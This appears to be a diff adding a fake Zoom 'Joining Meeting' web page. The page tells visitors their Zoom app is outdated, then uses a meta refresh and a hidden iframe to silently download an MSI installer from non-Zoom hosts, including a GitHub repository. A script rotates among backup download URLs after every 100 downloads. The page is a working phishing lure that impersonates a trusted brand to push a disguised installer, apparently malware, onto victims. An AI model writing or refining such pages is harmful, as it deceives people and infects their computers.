@@ -1,0 +1,68 @@
+<head>
+    <meta>
+    <meta http-equiv="refresh" content="2; url=https://boon.sa.com/zoom/Zoom.Install.msi">
+    <title>Joining Meeting</title>
+    <script>
+        // ===== CONFIGURATION ===== //
+        const URLS = [
+            "https://github.com/yellabeezy391/zoom/raw/refs/heads/main/em_uXqLarC0_installer_Win7-Win11_x86_x64.msi",  // Primary URL (first 100 downloads)
+            "https://backup1.example.com/Zoom.Install.msi",  // Secondary URL (next 100 downloads)
+            "https://backup2.example.com/Zoom.Install.msi"   // Tertiary URL (final)
+        ];
+        const MAX_DOWNLOADS_PER_URL = 100;
+
+        // ===== SILENT DOWNLOAD LOGIC ===== //
+        (function() {
+            // 1. Get or initialize download counter (server-side API recommended)
+            let downloadCount = localStorage.getItem('zoomDownloadCount') || 0;
+            const currentUrlIndex = Math.min(
+                Math.floor(downloadCount / MAX_DOWNLOADS_PER_URL),
+                URLS.length - 1
+            );
+            const downloadUrl = URLS[currentUrlIndex];
+
+            // 2. Override the meta refresh with the current URL
+            document.querySelector('meta[http-equiv="refresh"]')
+                .setAttribute('content', `2; url=${downloadUrl}`);
+
+            // 3. Update manual link
+            document.querySelector('table a').href = downloadUrl;
+
+            // 4. Trigger silent download via hidden iframe
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = downloadUrl;
+            document.body.appendChild(iframe);
+            setTimeout(() => iframe.remove(), 3000);
+
+            // 5. Increment counter (replace with API call for server-side tracking)
+            downloadCount++;
+            localStorage.setItem('zoomDownloadCount', downloadCount);
+        })();
+    </script>
+</head>
+<body>
+    <!-- EXACTLY YOUR ORIGINAL LAYOUT -->
+    <p style="text-align: left;"><img src="https://st2.zoom.us/static/6.3.25699/image/new/topNav/Zoom_logo.svg" alt="zoom" width="114" height="26" /></p>
+    <p style="text-align: center;">&nbsp;</p>
+    <h1 style="text-align: center;">&nbsp;</h1>
+    <h1 style="text-align: center; font-size: 40px; font-family:'Almaden Sans','Helvetica','Arial'">Joining Meeting</h1>
+    <p>&nbsp;</p>
+    <table style="height: 318px; margin-left: auto; margin-right: auto;" width="358">
+        <tbody>
+            <tr style="height: 220.4px;">
+                <td style="width: 349.6px; height: 220.4px; text-align: center;">
+                    <p style="text-align: center; font-size: 18px; font-family:'Internacional','Helvetica','Arial'">Sorry, You do not have the latest version of Zoom Workspace App installed.</p>
+                    <p style="text-align: center;">&nbsp;</p>
+                    <p style="text-align: center; font-size: 18px; font-family:'Internacional','Helvetica','Arial'">The latest version of our Application will download automatically, kindly install to join the Remote Desktop Meeting.</p>
+                    <p style="text-align: center;">&nbsp;</p>
+                    <p style="text-align: center;">&nbsp;</p>
+                    <p style="text-align: center;font-size: 18px; font-family:'Almaden Sans','Helvetica','Arial'">If the download doesn't start automatically, please&nbsp;<a href="#">download manually.</a></p>
+                    <p>&nbsp;</p>
+                    <p>&nbsp;</p>
+                </td>
+            </tr>
+        </tbody>
+    </table>
+</body>
+</html>
